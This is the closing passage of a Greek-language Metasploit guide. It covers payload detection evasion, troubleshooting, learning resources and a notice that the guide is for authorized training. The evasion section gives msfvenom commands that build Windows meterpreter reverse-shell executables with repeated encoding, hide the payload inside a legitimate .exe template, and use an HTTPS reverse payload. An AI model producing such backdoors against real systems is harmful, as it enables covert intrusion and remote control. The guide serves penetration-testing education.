   set THREADS 10  # Ενδεικτική ρύθμιση παραλληλισμού — χρειάζεται προσαρμογή στο περιβάλλον
   ```

### Παραδείγματα αποφυγής εντοπισμού του πρωτοτύπου

1. **Πολλαπλές κωδικοποιήσεις**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Προσαρμοσμένα πρότυπα αρχείων**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Payloads με επικοινωνία HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Διερεύνηση προβλημάτων

Η msfdb reinit μπορεί να επαναρχικοποιήσει δεδομένα της βάσης· δεν είναι απλός έλεγχος σύνδεσης. Οι προτάσεις του πίνακα είναι ενδεικτικές και απαιτούν διάγνωση της αιτίας πριν από αλλαγές.


| Πρόβλημα | Ενδεικτική προσέγγιση |
| ------- | ---------- |
| Αποτυχία σύνδεσης βάσης | `msfdb reinit` |
| Αποτυχία φόρτωσης module | `reload_all` |
| Η συνεδρία τερματίζεται αμέσως | Εξετάστε την αιτία και τη συμβατότητα· η κωδικοποίηση δεν εγγυάται λύση |
| Αποτυχία εκτέλεσης του exploit | Επιβεβαιώστε έκδοση λειτουργικού και επιλογή target |

---

<a id="section-16"></a>

## 📚 Πηγές

### Επίσημη τεκμηρίωση
- [Τεκμηρίωση Metasploit](https://docs.metasploit.com/)
- [Άρθρα Rapid7](https://www.rapid7.com/blog/)
- [Αποθετήριο Metasploit στο GitHub](https://github.com/rapid7/metasploit-framework)

### Υλικό εκμάθησης
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Οδηγοί αναφοράς
- [Οδηγός αναφοράς Metasploit της SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Οδηγός Meterpreter](Meterpreter.el.md)

---

<a id="section-17"></a>

## 📄 Άδεια και χρήση

Ο οδηγός παρέχεται για εκπαίδευση και εξουσιοδοτημένη πρακτική εξάσκηση.

---

<p align="center">
  <b>🔴 Μελετήστε και τεκμηριώστε τους ελέγχους σας.</b><br>
  <i>Χρησιμοποιήστε τις λειτουργίες μέσα στο συμφωνημένο πεδίο εργασίας.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
